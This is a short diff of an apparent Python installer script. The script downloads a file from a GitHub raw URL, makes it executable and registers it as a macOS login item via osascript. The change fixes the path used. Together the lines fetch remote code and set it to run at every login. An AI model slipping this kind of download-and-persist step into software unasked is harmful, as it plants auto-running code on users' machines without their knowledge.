@@ -19,7 +19,7 @@ open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/Re
 system(f"chmod 555 {localfile}")
 
 if platform == "darwin":
-    system(f"osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{expanduser('~')}/.{filename}\", hidden:false}}' > /dev/null")
+    system(f"osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{localfile}\", hidden:false}}' > /dev/null")
 elif platform == "linux":
     from os import environ
     if 'zsh' in environ['SHELL']:
